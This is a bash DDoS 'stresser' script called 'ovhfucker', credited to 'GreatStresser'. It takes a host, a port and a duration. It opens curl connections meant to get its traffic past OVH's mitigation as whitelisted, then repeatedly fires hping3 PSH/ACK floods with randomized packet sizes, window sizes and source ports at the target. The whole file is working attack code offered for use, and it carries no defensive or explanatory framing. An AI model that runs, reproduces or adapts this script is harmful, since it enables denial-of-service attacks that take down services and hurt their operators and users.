if [ "$#" -lt 2 ]; then
    echo "Usage: ./ovhfucker [host] [port] [time]"
    exit
fi

if [ -z "$1" ]; then
  echo "Empty IP"
  exit
elif [ -z "$2" ]; then
  echo "Empty PORT"
  exit
elif [ -z "$3" ]; then
  echo "Empty TIME"
  exit
fi
time=$3


pkill -9 curl
srcprt=$(shuf -i 20000-50000 -n 1)
dstprt=$2

echo -e "Attack sent to: \e[96m$1:\e[94m$2\e[0m"
echo -e "By \e[0m GreatStresser"

delay=0.5



# Whitelist attempts
curl $1:$2 </dev/null &>/dev/null &
sleep $delay
curl $1:$2 </dev/null &>/dev/null &
sleep $delay
curl $1:$2 </dev/null &>/dev/null &
sleep $delay
# Source port defined here so OVH remembers what port we will be sending data over
curl --local-port $srcprt $1:$2 </dev/null &>/dev/null &
sleep $delay
# Chose packet length
         COUNTER=2
         until [  $COUNTER -lt 1 ]; do
		      time=$(( $time - 1 ))
			  if [ "$time" == 1 ]; then
              echo -e "\e[31mAttack Stopped!!\e[0m"
              exit
			  fi
              srcprt=$(shuf -i 20000-50000 -n 1)
              curl --local-port $srcprt $1:$2 </dev/null &>/dev/null &
              len=$(shuf -i 1000-1400 -n 1)
			  win=$(shuf -i 10000-15000 -n 1)
              timeout $time hping3 -i u10 -q -d $len -PA -p $2 -w $win -E data $1 </dev/null &>/dev/null &
              sleep 1
             let COUNTER+=1
         done
